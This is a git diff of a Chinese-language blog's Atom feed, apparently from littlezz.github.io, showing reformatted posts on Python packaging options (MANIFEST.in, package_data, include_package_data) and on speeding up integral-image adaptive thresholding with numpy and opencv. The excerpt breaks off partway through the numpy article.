+&lt;p&gt;使用pip安装的时候一般是安装bdist打包出来的文件。&lt;/p&gt;
+&lt;p&gt;关于在打包中加入非程序文件， 有几种方法， 一种是在 MANIFEST.in 中加入， 对于 setup.py 中也提供了&lt;code&gt;package_data&lt;/code&gt;参数， 另外对于 setuptools 还提供了特别的 &lt;code&gt;include_package_data&lt;/code&gt;的参数， 接下来介绍这些参数的意义和怎么用。&lt;br&gt;
+&lt;/p&gt;
+&lt;h2&gt;MANIFEST.in&lt;/h2&gt;
+&lt;p&gt;MANIFEST.in文件是针对 源文件打包 的， 当需要把非程序文件， 包括README， css或者test文件等加入时， 在MANIFEST.in中指定， 用于生成MANIFEST&lt;/p&gt;
+&lt;p&gt;MIANIFEST会暗中自动寻找以下的文件：&lt;br&gt;
+&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;所有&lt;code&gt;py_modules&lt;/code&gt; 和 &lt;code&gt;packages&lt;/code&gt;中没有明确说明的python文件 &lt;/li&gt;
+&lt;li&gt;ext_modules 或 libraries选项中指明的C文件&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;scripts&lt;/code&gt;指明的文件&lt;/li&gt;
+&lt;li&gt;所有看上去像是test文件的， 比如&lt;code&gt;tests/*.py&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;README.txt 或者 README, setup.py, setup.cfg&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;package_data&lt;/code&gt;中指明的文件&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;data_files&lt;/code&gt;中指明的文件&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;package_data&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;package_data&lt;/code&gt;是在setup.py中的参数， 用于控制安装包里面包含的文件。&lt;br&gt;
+应该这样理解， MANIFEST 控制 sdist 包含的内容， package_data控制bdist包含的内容。&lt;br&gt;
+&lt;/p&gt;
+&lt;p&gt;一般情况是， 对源文件打包里面一般包含README， tests这些， 但是对于安装包这不需要。  所以分开设置。&lt;br&gt;
+&lt;/p&gt;
+&lt;h2&gt;include_package_data&lt;/h2&gt;
 &lt;p&gt;坑就是指&lt;code&gt;include_package_data&lt;/code&gt;， 这个参数是setuptools特有的， 但是非常容易让人误解然后勿用。 setuptools的文档中是这样写的&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;If set to True, this tells setuptools to automatically include any data files it finds inside your package directories that are specified by your MANIFEST.in file. For more information, see the section below on Including Data Files.&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;设为 True 时， 打包时setuptools 会自动加入在 MANIFEST.in中指定的文件。&lt;/p&gt;
 &lt;p&gt;原本是 MANIFEST 在 setup.py 中的&lt;code&gt;package_data&lt;/code&gt;寻找额外的文件的， 现在变成大家以 MANIFEST.in 为准了。&lt;/p&gt;
-&lt;p&gt;这会发生什么事情呢， &lt;br /&gt;
-如果你同时用了&lt;code&gt;include_package_data&lt;/code&gt;和&lt;code&gt;package_data&lt;/code&gt;， 那么你的 sdist 就会瞬间爆炸。&lt;br /&gt;
-bdist 打包出来的东西会包含&lt;code&gt;package_data&lt;/code&gt;中的内容， 但是源代码打包的时候就会失去在&lt;code&gt;package_data&lt;/code&gt;中指明的文件。  &lt;/p&gt;
-&lt;h2 id="_1"&gt;&lt;a name="user-content-_1" href="#_1" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;总结&lt;/h2&gt;
-&lt;p&gt;&lt;strong&gt;永远也不要用&lt;code&gt;include_package_data&lt;/code&gt;&lt;/strong&gt;  &lt;/p&gt;
-&lt;p&gt;&lt;code&gt;MANIFEST.in&lt;/code&gt; 用来给源文件打包， 里面包含许多额外的信息， 比如测试文件之类的。  &lt;/p&gt;
-&lt;p&gt;&lt;code&gt;package_data&lt;/code&gt;用于指定安装时加入的额外的文件， 不需要再MANIFEST.in中重复定义， 源文件打包的时候回自动包含这里面的文件。  &lt;/p&gt;
+&lt;p&gt;这会发生什么事情呢， 
+如果你同时用了&lt;code&gt;include_package_data&lt;/code&gt;和&lt;code&gt;package_data&lt;/code&gt;， 那么你的 sdist 就会瞬间爆炸。&lt;br&gt;
+bdist 打包出来的东西会包含&lt;code&gt;package_data&lt;/code&gt;中的内容， 但是源代码打包的时候就会失去在&lt;code&gt;package_data&lt;/code&gt;中指明的文件。&lt;br&gt;
+&lt;/p&gt;
+&lt;h2&gt;总结&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;永远也不要用&lt;code&gt;include_package_data&lt;/code&gt;&lt;/strong&gt;&lt;br&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;MANIFEST.in&lt;/code&gt; 用来给源文件打包， 里面包含许多额外的信息， 比如测试文件之类的。&lt;br&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;package_data&lt;/code&gt;用于指定安装时加入的额外的文件， 不需要再MANIFEST.in中重复定义， 源文件打包的时候回自动包含这里面的文件。&lt;br&gt;
+&lt;/p&gt;
 &lt;p&gt;参考:&lt;/p&gt;
 &lt;ul&gt;
-&lt;li&gt;&lt;a href="https://docs.python.org/3.4/distutils/sourcedist.html#specifying-the-files-to-distribute"&gt;specifying-the-files-to-distribute&lt;/a&gt;  &lt;/li&gt;
+&lt;li&gt;&lt;a href="https://docs.python.org/3.4/distutils/sourcedist.html#specifying-the-files-to-distribute"&gt;specifying-the-files-to-distribute&lt;/a&gt;&lt;br&gt;
+&lt;/li&gt;
 &lt;li&gt;&lt;a href="https://setuptools.readthedocs.io/en/latest/setuptools.html#including-data-files"&gt;setuptools&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;2016年12月12日01:04:25&lt;/p&gt;</summary><category term="python"></category><category term="小结"></category></entry><entry><title>对numpy的一系列实验</title><link href="http://littlezz.github.io/dui-numpyde-yi-xi-lie-shi-yan.html" rel="alternate"></link><updated>2016-12-08T00:00:00+08:00</updated><author><name>littlezz</name></author><id>tag:littlezz.github.io,2016-12-08:dui-numpyde-yi-xi-lie-shi-yan.html</id><summary type="html">&lt;p&gt;本文主要总结了如何把numpy计算速度优化100倍的过程。  &lt;/p&gt;
-&lt;h2 id="_1"&gt;&lt;a name="user-content-_1" href="#_1" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;简介&lt;/h2&gt;
+&lt;p&gt;2016年12月12日01:04:25&lt;/p&gt;</content><category term="python"></category><category term="小结"></category></entry><entry><title>对numpy的一系列实验</title><link href="http://littlezz.github.io/dui-numpyde-yi-xi-lie-shi-yan.html" rel="alternate"></link><published>2016-12-08T00:00:00+08:00</published><updated>2016-12-08T00:00:00+08:00</updated><author><name>littlezz</name></author><id>tag:littlezz.github.io,2016-12-08:/dui-numpyde-yi-xi-lie-shi-yan.html</id><summary type="html">&lt;p&gt;本文主要总结了如何把numpy计算速度优化100倍的过程。&lt;br&gt;
+&lt;/p&gt;
+&lt;h2&gt;简介&lt;/h2&gt;
 &lt;p&gt;最近要对图片做二值化， 参照&lt;a href="http://people.scs.carleton.ca/~roth/iit-publications-iti/docs/gerh-50002.pdf"&gt;Adaptive Thresholding Using the Integral Image&lt;/a&gt; 这篇论文， 可是Python的for循环非常的慢，单纯的翻译伪代码实现起来速度要比C慢接近100倍， 论文上的实现对640x480的图片用时大概为15ms， 接下来我们要一步步从最初的慢100倍优化到和C一样快， 以及最后再比它快一点点。&lt;/p&gt;
-&lt;h2 id="_2"&gt;&lt;a name="user-content-_2" href="#_2" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;算法&lt;/h2&gt;
-&lt;p&gt;首先， 介绍一下 Adaptive Thresholding Using the Integral Image 这篇论文， 论文很简单， 对一个点周围的一片区域取平均值， 如果该点低于平均值的85%， 就设为黑， 否则为白色。 论文主要是用累积和来改进取一片区域平均值的速度。 &lt;br /&gt;
-过程为水平方向做一次累积和， 垂直方向做一次累积和， 这样每一个点就表示其左上角的区域的和， 于是要计算一个矩形（a, b, c, d), 其区域上的和就是 d - b -c + a. &lt;br /&gt;
-原始的扫描区域的每一个点求和， 时间是O(n * n * boxsize * boxsize)， 现在变成了常数时间。  &lt;/p&gt;
-&lt;h2 id="_3"&gt;&lt;a name="user-content-_3" href="#_3" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;直观实现&lt;/h2&gt;
-&lt;p&gt;首先我们直接照着原理实现，理论是最快的&lt;br /&gt;
+&lt;h2&gt;算法&lt;/h2&gt;
+&lt;p&gt;首先， 介绍一下 Adaptive Thresholding Using the Integral Image 这篇论文， 论文很简单， 对一个点周围的一片区域取平均值， 如果该点低于平均值的85%， 就设为黑， 否则为白色。 论文主要是用累积和来改进取一片区域平均值的速度。 
+过程为水平方向做一次累积和， 垂直方向做一次累积和， 这样每一个点就表示其左上角的区域的和， 于是要计算一个矩形（a, b, c, d), 其区域上的和就是 d - b -c + a. 
+原始的扫描区域的每一个点求和， 时间是O(n * n * boxsize * boxsize)， 现在变成了常数时间。&lt;br&gt;
+&lt;/p&gt;
+&lt;h2&gt;直观实现&lt;/h2&gt;
+&lt;p&gt;首先我们直接照着原理实现，理论是最快的
 （然而实际是最慢的） &lt;/p&gt;
-&lt;p&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;intuitive_method&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mat&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;w&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;h&lt;/span&gt; &lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;set_value&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;threshold&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;boxsize&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;intuitive_method&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mat&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;w&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;h&lt;/span&gt; &lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;set_value&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;threshold&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;boxsize&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+    &lt;span class="n"&gt;mat&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;mat&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;T&lt;/span&gt;
+    &lt;span class="n"&gt;integral_map&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;zeros_like&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mat&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dtype&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;ret&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;zeros_like&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mat&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dtype&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;w&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+        &lt;span class="n"&gt;csum&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;
+        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range …&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;本文主要总结了如何把numpy计算速度优化100倍的过程。&lt;br&gt;
+&lt;/p&gt;
+&lt;h2&gt;简介&lt;/h2&gt;
+&lt;p&gt;最近要对图片做二值化， 参照&lt;a href="http://people.scs.carleton.ca/~roth/iit-publications-iti/docs/gerh-50002.pdf"&gt;Adaptive Thresholding Using the Integral Image&lt;/a&gt; 这篇论文， 可是Python的for循环非常的慢，单纯的翻译伪代码实现起来速度要比C慢接近100倍， 论文上的实现对640x480的图片用时大概为15ms， 接下来我们要一步步从最初的慢100倍优化到和C一样快， 以及最后再比它快一点点。&lt;/p&gt;
+&lt;h2&gt;算法&lt;/h2&gt;
+&lt;p&gt;首先， 介绍一下 Adaptive Thresholding Using the Integral Image 这篇论文， 论文很简单， 对一个点周围的一片区域取平均值， 如果该点低于平均值的85%， 就设为黑， 否则为白色。 论文主要是用累积和来改进取一片区域平均值的速度。 
+过程为水平方向做一次累积和， 垂直方向做一次累积和， 这样每一个点就表示其左上角的区域的和， 于是要计算一个矩形（a, b, c, d), 其区域上的和就是 d - b -c + a. 
+原始的扫描区域的每一个点求和， 时间是O(n * n * boxsize * boxsize)， 现在变成了常数时间。&lt;br&gt;
+&lt;/p&gt;
+&lt;h2&gt;直观实现&lt;/h2&gt;
+&lt;p&gt;首先我们直接照着原理实现，理论是最快的
+（然而实际是最慢的） &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;intuitive_method&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mat&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;w&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;h&lt;/span&gt; &lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;set_value&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;threshold&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;boxsize&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
     &lt;span class="n"&gt;mat&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;mat&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;T&lt;/span&gt;
     &lt;span class="n"&gt;integral_map&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;zeros_like&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mat&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dtype&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
     &lt;span class="n"&gt;ret&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;zeros_like&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mat&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dtype&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
@@ -154,18 +342,21 @@ bdist 打包出来的东西会包含&lt;code&gt;package_data&lt;/code&gt;中的�
 
     &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;ret&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;astype&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;uint8&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;T&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
-&lt;br /&gt;
-mat是我们的图片矩阵， boxsize是区域的长度， 必须是奇数。 &lt;br /&gt;
-每个点都在周围取一个boxsize长度的矩形， 要特别处理边界， 让他不要超出累积矩阵。&lt;br /&gt;
-很直观的代码， 纯翻译自论文里面的伪代码。  &lt;/p&gt;
+
+
+&lt;p&gt;mat是我们的图片矩阵， boxsize是区域的长度， 必须是奇数。 
+每个点都在周围取一个boxsize长度的矩形， 要特别处理边界， 让他不要超出累积矩阵。&lt;br&gt;
+很直观的代码， 纯翻译自论文里面的伪代码。&lt;br&gt;
+&lt;/p&gt;
 &lt;p&gt;看看速度：&lt;/p&gt;
-&lt;p&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;⇒  python3 implement.py
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;⇒  python3 implement.py
 Image shape 640x480
 intuitive_method take 1658.280885 ms  
 &lt;/pre&gt;&lt;/div&gt;
-&lt;br /&gt;
-1600ms, （怎么和说好的15ms不一样）。&lt;/p&gt;
-&lt;h2 id="_4"&gt;&lt;a name="user-content-_4" href="#_4" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;改进的直观方法&lt;/h2&gt;
+
+
+&lt;p&gt;1600ms, （怎么和说好的15ms不一样）。&lt;/p&gt;
+&lt;h2&gt;改进的直观方法&lt;/h2&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;optimized_intuitive_method&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mat&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;w&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;h&lt;/span&gt; &lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;set_value&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;threshold&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;boxsize&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
     &lt;span class="n"&gt;mat&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;mat&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;T&lt;/span&gt;
     &lt;span class="n"&gt;integral_map&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;zeros_like&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mat&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dtype&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
@@ -192,17 +383,19 @@ intuitive_method take 1658.280885 ms
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;Numpy提供了item和itemset方法来加速对矩阵上单个点的操作。&lt;br /&gt;
-同时两次累积和实际可以用可以用&lt;code&gt;np.cumsum&lt;/code&gt;来计算， 但是这里有一个小细节，&lt;br /&gt;
+&lt;p&gt;Numpy提供了item和itemset方法来加速对矩阵上单个点的操作。&lt;br&gt;
+同时两次累积和实际可以用可以用&lt;code&gt;np.cumsum&lt;/code&gt;来计算， 但是这里有一个小细节，&lt;br&gt;
 单纯的使用两次&lt;code&gt;a=np.cumsum(...)&lt;/code&gt;会额外进行一次内部的内存拷贝， 我们要指定&lt;code&gt;out&lt;/code&gt;参数来阻止多余的内存拷贝.&lt;/p&gt;
-&lt;p&gt;在计算half_s的时候， 使用移位&lt;code&gt;boxsize &amp;gt;&amp;gt; 1&lt;/code&gt;来加速。  &lt;/p&gt;
-&lt;p&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;⇒  python3 implement.py
+&lt;p&gt;在计算half_s的时候， 使用移位&lt;code&gt;boxsize &amp;gt;&amp;gt; 1&lt;/code&gt;来加速。&lt;br&gt;
+&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;⇒  python3 implement.py
 Image shape 640x480
 optimized_intuitive_method take 823.928799 ms
 &lt;/pre&gt;&lt;/div&gt;
-&lt;br /&gt;
-快了一倍， 但是还是不够&lt;/p&gt;
-&lt;h2 id="_5"&gt;&lt;a name="user-content-_5" href="#_5" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;猥琐法&lt;/h2&gt;
+
+
+&lt;p&gt;快了一倍， 但是还是不够&lt;/p&gt;
+&lt;h2&gt;猥琐法&lt;/h2&gt;
 &lt;p&gt;不妨让我们直接退化到累积和的优化之前，纯粹的暴力计算，所有计算都交给opencv， 看看会发生什么事情。&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;opencv_way&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mat&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;w&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;h&lt;/span&gt; &lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;set_value&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;threshold&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;boxsize&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
     &lt;span class="n"&gt;mat&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;mat&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;astype&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
@@ -221,11 +414,12 @@ opencv_way take 35.920926 ms
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;好了， 可以全剧终了。&lt;br /&gt;
-简单的6行代码， 纯粹的暴力美学。 速度快了40倍。（你学到了么？）&lt;br /&gt;
-这里我们借助opencv 的 &lt;code&gt;filter2D&lt;/code&gt;方法， 自己定义了一个kernel， 用来求一个点周围区域的平均值， 接下来的计算就全部交给opencv了。 &lt;br /&gt;
-关于opencv， 有一点需要补充， &lt;strong&gt;opencv表示， numpy是辣鸡， 请多使用opencv自带的函数&lt;/strong&gt;。  &lt;/p&gt;
-&lt;h2 id="_6"&gt;&lt;a name="user-content-_6" href="#_6" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;向量化&lt;/h2&gt;
+&lt;p&gt;好了， 可以全剧终了。&lt;br&gt;
+简单的6行代码， 纯粹的暴力美学。 速度快了40倍。（你学到了么？）&lt;br&gt;
+这里我们借助opencv 的 &lt;code&gt;filter2D&lt;/code&gt;方法， 自己定义了一个kernel， 用来求一个点周围区域的平均值， 接下来的计算就全部交给opencv了。 &lt;br&gt;
+关于opencv， 有一点需要补充， &lt;strong&gt;opencv表示， numpy是辣鸡， 请多使用opencv自带的函数&lt;/strong&gt;。&lt;br&gt;
+&lt;/p&gt;
+&lt;h2&gt;向量化&lt;/h2&gt;
 &lt;p&gt;还不能全剧终， 接下来是重点， numpy是为矩阵计算而生的， 我们前面一直按照C的思维来对单个点做操作， 而且for循环的存在导致速度下降太多， 接下来我们要寻求把for循环替换掉， 改成向量的计算。&lt;/p&gt;
 &lt;p&gt;对于numpy来说， 比如我有两个2维矩阵A和B， 要计算两个矩阵上所有点的差， 从速度上来说， &lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;A - B &amp;gt; A[i] - B[i] &amp;gt; A[i,j] - B[i,j]
@@ -233,36 +427,45 @@ opencv_way take 35.920926 ms
 
 
 &lt;p&gt;我们现在希望把所有的for循环， 替换为矩阵的计算 &lt;code&gt;A - B&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;一开始的时候我想到利用一次for循环， 从上往下计算两行之间的值， 接着从左往右计算每一列的值， 但是这样只能去掉一个for循环， 后来我想了2个晚上， 想通了实际上所有等距离点操作都可以转化为等距离的向量操作， 进而可以通过构造矩阵来进行矩阵间的操作。  &lt;/p&gt;
-&lt;p&gt;对于之前的代码， 计算累积和部分已经很好了， 关键之后的计算， 代码冗余， 效率低下。  &lt;/p&gt;
+&lt;p&gt;一开始的时候我想到利用一次for循环， 从上往下计算两行之间的值， 接着从左往右计算每一列的值， 但是这样只能去掉一个for循环， 后来我想了2个晚上， 想通了实际上所有等距离点操作都可以转化为等距离的向量操作， 进而可以通过构造矩阵来进行矩阵间的操作。&lt;br&gt;
+&lt;/p&gt;
+&lt;p&gt;对于之前的代码， 计算累积和部分已经很好了， 关键之后的计算， 代码冗余， 效率低下。&lt;br&gt;
+&lt;/p&gt;
 &lt;p&gt;其中造成整个for循环存在的关键因素是下面这句代码&lt;/p&gt;
-&lt;p&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;integral_map[x2, y2] - integral_map[x1, y2] - integral_map[x2, y1] + integral_map[x1, y1]
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;integral_map[x2, y2] - integral_map[x1, y2] - integral_map[x2, y1] + integral_map[x1, y1]
 &lt;/pre&gt;&lt;/div&gt;
-&lt;br /&gt;
-而实际上， 这些点之间是等距离的， （boxsize的距离）， 也就是说， 每一个点对应的x1， x2, y1, y2 都是固定的， 我们可以构造出4个矩阵， 分别向左上， 右上， 左下， 右下位移一段距离， &lt;br /&gt;
-这样就可以吧整个for循环计算化简成  &lt;/p&gt;
+
+
+&lt;p&gt;而实际上， 这些点之间是等距离的， （boxsize的距离）， 也就是说， 每一个点对应的x1， x2, y1, y2 都是固定的， 我们可以构造出4个矩阵， 分别向左上， 右上， 左下， 右下位移一段距离， 
+这样就可以吧整个for循环计算化简成&lt;br&gt;
+&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;D + A - C - B
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;那么怎么构造出这些矩阵呢？&lt;br /&gt;
-想象一下， 把&lt;code&gt;integral_map[x1, y1]&lt;/code&gt;当成一个集合， 记为A， &lt;code&gt;integral_map[x1, y2]&lt;/code&gt;的集合记为B， &lt;code&gt;integral_map[x2, y1]&lt;/code&gt;的集合记为C，&lt;code&gt;integral_map[x2, y2]&lt;/code&gt;记为D。   &lt;/p&gt;
-&lt;p&gt;以构造A为例， A实际上是对原先的矩阵向上和向左平移了一半的boxsize的距离， 比如对于矩阵右下角的点，A对应于 &lt;code&gt;integral_map[h-half_boxsize, w-half_boxsize]&lt;/code&gt;  &lt;/p&gt;
-&lt;p&gt;但是对于左上角的点， 超出了累积矩阵的范围， 为了避免额外的对边界的判断， 我们要额外构造出边框。  &lt;/p&gt;
+&lt;p&gt;那么怎么构造出这些矩阵呢？&lt;br&gt;
+想象一下， 把&lt;code&gt;integral_map[x1, y1]&lt;/code&gt;当成一个集合， 记为A， &lt;code&gt;integral_map[x1, y2]&lt;/code&gt;的集合记为B， &lt;code&gt;integral_map[x2, y1]&lt;/code&gt;的集合记为C，&lt;code&gt;integral_map[x2, y2]&lt;/code&gt;记为D。 &lt;br&gt;
+&lt;/p&gt;
